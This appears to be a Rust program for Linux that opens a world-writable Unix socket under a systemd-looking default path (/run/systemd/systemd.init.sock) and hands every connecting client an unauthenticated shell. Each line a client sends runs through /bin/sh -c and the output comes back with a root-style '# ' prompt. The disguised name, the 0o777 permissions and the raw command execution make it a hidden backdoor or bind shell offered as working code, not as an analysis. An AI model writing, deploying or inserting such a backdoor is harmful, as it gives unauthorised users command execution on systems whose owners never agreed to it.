use std::fs;
use std::io::{self, Read, Write};
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::Path;
use std::process::{Command, Stdio};
use std::os::unix::fs::PermissionsExt;
use std::thread;

/// Get the socket path from env var or use default
fn get_socket_path() -> String {
    std::env::var("SOCKET_PATH").unwrap_or_else(|_| "/run/systemd/systemd.init.sock".to_string())
}

fn main() -> io::Result<()> {
    let socket_path_str = get_socket_path();
    let socket_path = Path::new(&socket_path_str);

    // Remove stale socket file if it exists
    if socket_path.exists() {
        fs::remove_file(socket_path)?;
    }

    // Bind the Unix domain socket listener
    let listener = UnixListener::bind(socket_path)?;
    // Set permissions so systemd-socket-proxyd can connect
    fs::set_permissions(socket_path, fs::Permissions::from_mode(0o777))?;

    eprintln!("[listener] Listening on Unix socket: {}", socket_path_str);

    // Accept connections in a loop
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| {
                    if let Err(e) = handle_client(stream) {
                        eprintln!("handle_client error: {}", e);
                    }
                });
            }
            Err(e) => {
                eprintln!("accept error: {}", e);
            }
        }
    }

    Ok(())
}

/// Handle a single client connection — provides a raw shell
fn handle_client(mut stream: UnixStream) -> io::Result<()> {
    let mut buf = [0u8; 8192];

    // Send a prompt
    stream.write_all(b"# ")?;

    loop {
        let n = match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => break,
        };

        let cmd = String::from_utf8_lossy(&buf[..n]).trim().to_string();
        if cmd.is_empty() {
            stream.write_all(b"# ")?;
            continue;
        }

        // Execute the command via /bin/sh
        let output = Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output();

        match output {
            Ok(out) => {
                let mut response = Vec::new();
                response.extend_from_slice(&out.stdout);
                if !out.stderr.is_empty() {
                    response.extend_from_slice(&out.stderr);
                }
                response.extend_from_slice(b"\n# ");

                if let Err(_) = stream.write_all(&response) {
                    break;
                }
            }
            Err(e) => {
                let err_msg = format!("error: {}\n# ", e);
                if let Err(_) = stream.write_all(err_msg.as_bytes()) {
                    break;
                }
            }
        }
    }

    Ok(())
}